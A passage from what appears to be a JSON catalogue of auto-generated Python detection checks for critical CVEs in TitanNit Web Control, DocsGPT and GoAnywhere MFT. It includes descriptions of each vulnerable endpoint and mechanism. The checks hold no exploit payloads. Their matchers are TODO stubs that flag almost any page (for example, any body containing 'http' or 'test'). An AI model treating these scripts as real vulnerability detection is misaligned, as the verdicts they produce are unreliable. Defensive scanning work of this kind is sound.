\"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"TitanNit Web Control 2.01/Atemio 7600 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_9166(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-9166\nName: TitanNit Web Control 2.01/Atemio 7600 - Remote Code Execution\nSeverity: critical\nDescription: The device contains a command injection caused by the 'getcommand' query in the application, letting unauthorized attackers execute system commands with root privileges, exploit requires attacker to send crafted requests.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_9166:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-9166\"\n    SEVERITY = \"critical\"\n    NAME = \"TitanNit Web Control 2.01/Atemio 7600 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'http' | mot(s) 'titan.css'\"\n\n        # Simple word matcher simulation\n        matchers = ['http', 'titan.css']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"TitanNit Web Control 2.01/Atemio 7600 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_9166(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2024-9166"
        ],
        "tags": [
          "cve",
          "cve2024",
          "titanit",
          "web-control",
          "oast",
          "rce",
          "ics",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_0868",
        "name": "DocsGPT - Unauthenticated Remote Code Execution",
        "language": "Python",
        "famille": "CVE",
        "description": "A vulnerability, that could result in Remote Code Execution (RCE), has been found in DocsGPT. Due to improper parsing of JSON data using eval() an unauthorized attacker could send arbitrary Python code to be executed via /api/remote endpoint.This issue affects DocsGPT- from 0.8.1 through 0.12.0.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'dns' | mot(s) '\"task_id\":, \"status\":'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-0868\nName: DocsGPT - Unauthenticated Remote Code Execution\nSeverity: critical\nDescription: A vulnerability, that could result in Remote Code Execution (RCE), has been found in DocsGPT. Due to improper parsing of JSON data using eval() an unauthorized attacker could send arbitrary Python code to be executed via /api/remote endpoint.This issue affects DocsGPT- from 0.8.1 through 0.12.0.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_0868:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-0868\"\n    SEVERITY = \"critical\"\n    NAME = \"DocsGPT - Unauthenticated Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'dns\\' | mot(s) \\'\"task_id\":, \"status\":\\''\n\n        # Simple word matcher simulation\n        matchers = ['dns', '\"task_id\":, \"status\":']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"DocsGPT - Unauthenticated Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_0868(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-0868\nName: DocsGPT - Unauthenticated Remote Code Execution\nSeverity: critical\nDescription: A vulnerability, that could result in Remote Code Execution (RCE), has been found in DocsGPT. Due to improper parsing of JSON data using eval() an unauthorized attacker could send arbitrary Python code to be executed via /api/remote endpoint.This issue affects DocsGPT- from 0.8.1 through 0.12.0.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_0868:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-0868\"\n    SEVERITY = \"critical\"\n    NAME = \"DocsGPT - Unauthenticated Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'dns\\' | mot(s) \\'\"task_id\":, \"status\":\\''\n\n        # Simple word matcher simulation\n        matchers = ['dns', '\"task_id\":, \"status\":']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"DocsGPT - Unauthenticated Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_0868(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "docsgpt",
          "unauth",
          "rce",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_10035",
        "name": "GoAnywhere - Authentication Bypass",
        "language": "Python",
        "famille": "CVE",
        "description": "Fortra GoAnywhere MFT contains an insecure deserialization vulnerability in the License Servlet caused by deserializing attacker-controlled objects with a valid forged license response signature, letting attackers perform command injection, exploit requires valid forged license signature.",
        "severity": "critical",
        "detection": "[OR] DSL: contains_all(location, \"request?bundle=\", \"my.goanywhere.com\"); status_code == 302",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "{{to_lower(rand_text_alpha(5))}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-10035\nName: GoAnywhere - Authentication Bypass\nSeverity: critical\nDescription: Fortra GoAnywhere MFT contains an insecure deserialization vulnerability in the License Servlet caused by deserializing attacker-controlled objects with a valid forged license response signature, letting attackers perform command injection, exploit requires valid forged license signature.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_10035:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-10035\"\n    SEVERITY = \"critical\"\n    NAME = \"GoAnywhere - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains_all(location, \"request?bundle=\", \"my.goanywhere.com\"); status_code == 302'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"GoAnywhere - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_10035(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-10035\nName: GoAnywhere - Authentication Bypass\nSeverity: critical\nDescription: Fortra GoAnywhere MFT contains an insecure deserialization vulnerability in the License Servlet caused by deserializing attacker-controlled objects with a valid forged license response signature, letting attackers perform command injection, exploit requires valid forged license signature.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_10035:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-10035\"\n    SEVERITY = \"critical\"\n    NAME = \"GoAnywhere - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains_all(location, \"request?bundle=\", \"my.goanywhere.com\"); status_code == 302'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI 